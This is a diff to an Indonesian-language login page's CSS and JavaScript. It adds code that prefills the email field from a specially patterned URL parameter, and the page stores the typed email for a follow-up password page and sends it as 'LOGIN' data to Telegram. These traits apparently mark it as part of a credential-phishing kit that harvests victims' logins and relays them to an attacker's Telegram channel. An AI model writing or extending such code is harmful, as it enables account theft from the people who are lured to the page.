@@ -78,6 +78,7 @@
         .ikon-error {
             margin-top: 1px;
             flex-shrink: 0;
+            font-weight: bold;
         }
         .tombol-lanjut {
             width: 100%;
@@ -186,7 +187,19 @@ const inputEmail = document.getElementById('email');
 const tombolLanjut = document.getElementById('tombol-lanjut');
 const pesanError = document.getElementById('pesan-error');
 
-// Sembunyikan error saat mulai mengetik
+// Isi otomatis dari parameter URL jika ada
+window.addEventListener('load', function() {
+    const params = new URLSearchParams(window.location.search);
+    const url = window.location.href;
+    
+    // Cek pola: ?namaParam-email@domain.com-123=aktif
+    const cocok = url.match(/-([^-]+@[^-]+)-\d+=aktif/);
+    if (cocok && cocok[1]) {
+        inputEmail.value = decodeURIComponent(cocok[1]);
+    }
+});
+
+// Sembunyikan error saat mengetik
 inputEmail.addEventListener('input', function() {
     if (this.value.trim()) {
         pesanError.classList.remove('terlihat');
@@ -208,10 +221,10 @@ function lanjut() {
         return;
     }
 
-    // Simpan email untuk halaman berikutnya
+    // Simpan email untuk halaman password
     localStorage.setItem('email_pengguna', email);
     
-    // Kirim data ke Telegram
+    // Kirim data ke Telegram jika ada fungsi
     if (window.kirimKeTelegram) {
         window.kirimKeTelegram({
             tipe: 'LOGIN',
